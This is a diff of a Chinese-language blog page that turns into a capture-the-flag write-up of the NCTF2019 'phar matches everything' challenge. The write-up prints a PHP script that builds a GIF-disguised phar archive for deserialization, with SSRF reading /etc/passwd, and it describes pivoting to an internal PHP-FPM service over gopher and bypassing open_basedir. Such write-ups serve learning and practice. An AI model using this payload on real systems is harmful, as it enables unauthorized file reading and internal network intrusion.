@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
   <head>
-       <meta http-equiv="content-type" content="text/html; charset=utf-8">
+      <meta http-equiv="content-type" content="text/html; charset=utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
   <meta content="yes" name="apple-mobile-web-app-capable" />
   <meta content="black" name="apple-mobile-web-app-status-bar-style" />
@@ -9,14 +9,14 @@
   <meta name="keywords" content="">
   <meta name="description" content="">
   <meta name="author" content="kveln">
-  <title>Web安全 | 过客</title>
+  <title>[NCTF2019]phar matches everything(phar反序列化) | 过客</title>
   <link href="https://cdn.bootcss.com/twitter-bootstrap/4.3.1/css/bootstrap.min.css" rel="stylesheet">
   <!-- <link href="https://guokeya.github.io/media/css/bootstrap.min.css" rel="stylesheet"> -->
   <!--  <link href="https://guokeya.github.io/media/css/all.min.css" rel="stylesheet" type="text/css"> -->
   <link href="https://cdn.bootcss.com/font-awesome/5.11.2/css/all.min.css" rel="stylesheet">
   <link href='https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
   <link href='https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>
-  <link rel="alternate" type="application/rss+xml" title="Web安全 | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
+  <link rel="alternate" type="application/rss+xml" title="[NCTF2019]phar matches everything(phar反序列化) | 过客 » Feed" href="https://guokeya.github.io/atom.xml">
   <link rel="stylesheet"href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.15.10/build/styles/androidstudio.min.css">
   <link href="https://guokeya.github.io/styles/main.css" rel="stylesheet">
   <script src="https://cdn.bootcss.com/jquery/3.4.1/jquery.min.js"></script>
@@ -25,6 +25,11 @@
   <script>hljs.initHighlightingOnLoad();</script>
   
 
+    <meta property="og:description" content="[NCTF2019]phar matches everything(phar反序列化)"/>
+    <meta property="og:url" content="https://guokeya.github.io/post/1byvbzb_I/"/>
+    <meta property="og:locale" content="zh-CN"/>
+    <meta property="og:type" content="website"/>
+    <meta property="og:site_name" content="过客"/>
   </head>
   <body>
   	<!-- Navigation -->
@@ -66,94 +71,107 @@
       </div>
     </div>
   </nav>
-<!-- Page Header -->
+  <!-- Page Header -->
   <header class="masthead" style="background-image: url('https://guokeya.github.io/media/images/home-bg.jpg')">
     <div class="overlay"></div>
     <div class="container">
       <div class="row">
         <div class="col-lg-8 col-md-10 mx-auto">
           <div class="post-heading">
-            <h1 class="tag-tl">#Web安全</h1>
+          	<span class="tags">
+          	 
+            <a href="https://guokeya.github.io/tag/CTF/" class="tag">CTF</a>
+            
+            <a href="https://guokeya.github.io/tag/Web/" class="tag">Web安全</a>
+            
+        </span>
+            <h1>[NCTF2019]phar matches everything(phar反序列化)</h1>
+            <span class="meta">
+            	Posted on
+              2020-03-31，2 min read
+            </span>
           </div>
         </div>
       </div>
     </div>
   </header>
+
+  <!-- Post Content -->
+  <article>
     <div class="container">
-    <div class="row">
-      <div class="col-lg-8 col-md-10 mx-auto">
-       
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/oUQYTq6U9/">
-            <h2 class="post-title">
-              CTF PHP代码审计中file_put_contents函数利用
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p>源码分析</p>
+      <div class="row">
+        <div class="col-lg-8 col-md-10 mx-auto">
+          <p>这题得从github上下源码。<br>
+进入web。有两个功能。一个是判断文件类型。一个是文件上传。配合源码。分析一下<br>
+文件上传：</p>
+<!-- more -->
+<p><img src="https://guokeya.github.io/post-images/1585645145750.png" alt="" loading="lazy"><br>
+通过审计代码。发现只能上传图片。那么得配合其他文件使用。<br>
+判断类型：<br>
+<img src="https://guokeya.github.io/post-images/1585645968858.png" alt="" loading="lazy"><br>
+这里有两个反序列化。第一次看会有点乱。</p>
+<pre><code>第一次反序列化。。是通过getimagesize函数phar://图片文件。触发的
+反序列化影响main类。
+可控$this-&gt;url。可以进行SSRF
+</code></pre>
+<pre><code>第二次反序列化。。是通过main函数的析构函数触发的
+反序列化影响Easytest类
+主要是为了满足$this_is_a_easy_test-&gt;funny_get() === '1'
+</code></pre>
+<p>下面构造payload读取任意文件</p>
+<pre><code>&lt;?php
+class Easytest{
+	protected $test='1';
+}
+class Main{
+	public $url='file:///etc/passwd';
+}
+$a=new Easytest();
+echo urlencode(serialize($a));
+$b=new Main();
+@unlink(&quot;phar.phar&quot;);
+$phar=new Phar(&quot;phar.phar&quot;);
+$phar-&gt;startBuffering(); 
+$phar-&gt;setStub('GIF89a'.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); 
+$phar-&gt;setMetadata($b); 
+$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;);
+$phar-&gt;stopBuffering();
+?&gt;
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1585646946884.png" alt="" loading="lazy"><br>
+然后读取各种文件都无果。尝试读取hosts文件。打内网<br>
+读取hosts文件得到<code>173.15.85.9</code><br>
+尝试访问<code>http://173.15.85.10</code><br>
+<img src="https://guokeya.github.io/post-images/1585647243553.png" alt="" loading="lazy"><br>
+估计是打PHP-FPM未授权。<br>
+将url设置为gopher协议。打个phpinfo出来<br>
+<img src="https://guokeya.github.io/post-images/1585647482202.png" alt="" loading="lazy"><br>
+phpinfo中得到有open_basedir<br>
+<img src="https://guokeya.github.io/post-images/1585647572042.png" alt="" loading="lazy"><br>
+bypass一下<br>
+<img src="https://guokeya.github.io/post-images/1585647686706.png" alt="" loading="lazy"><br>
+得到Flag在根目录下<br>
+<img src="https://guokeya.github.io/post-images/1585647761967.png" alt="" loading="lazy"><br>
+构造读取<br>
+<img src="https://guokeya.github.io/post-images/1585647898961.png" alt="" loading="lazy"><br>
+得到Flag<br>
+<img src="https://guokeya.github.io/post-images/1585647924591.png" alt="" loading="lazy"></p>
 
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">1 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/Olw-A4WVi/">
-            <h2 class="post-title">
-              Mysql limit注入
-            </h2>
+          
+          <p class="next-post">下一篇：
+            <a href="https://guokeya.github.io/post/lkyWhDNE/">
+              <span class="post-title">
+                [GoogleCTF2019 Quals]Bnv(本地dtdxxe)&rarr;
+              </span>
             </a>
-            <h3 class="post-subtitle">
-              <p><strong>实验环境</strong><br>
-http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1</p>
-
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">2 min read</span>
-            </p>
+          </p>
+        
+        <div class="comment">
+          
         </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        <div class="post-preview">
-          <a href="https://guokeya.github.io/post/li-yong-huan-jing-bian-liang-ld_preload-rao-guo-php-disable_function-zhi-xing-xi-tong-ming-ling/">
-            <h2 class="post-title">
-              利用环境变量LD_PRELOAD绕过php disable_function执行系统命令
-            </h2>
-            </a>
-            <h3 class="post-subtitle">
-              <p><strong>利用条件</strong><br>
-php未禁用putenv，mail函数</p>
-
-            </h3>
-          <p class="post-meta">
-             <span class="time">2020-01-02</span>
-             <span>,</span>
-             <span class="post-stats">4 min read</span>
-            </p>
-        </div>
-        <hr>
-        <div class="clearfix">
-        </div>
-        
-        
-        <a class="btn btn-primary float-left" href="https://guokeya.github.io/tag/Web/page/6/">&larr; 上一页</a>
-        
-        
       </div>
     </div>
-  </div>
-
-  
+  </article>
  <!-- Footer -->
   <footer>
     <div class="container">
@@ -225,3 +243,4 @@ php未禁用putenv，mail函数</p>
   })(this));</script>
   </body>
 </html>
+
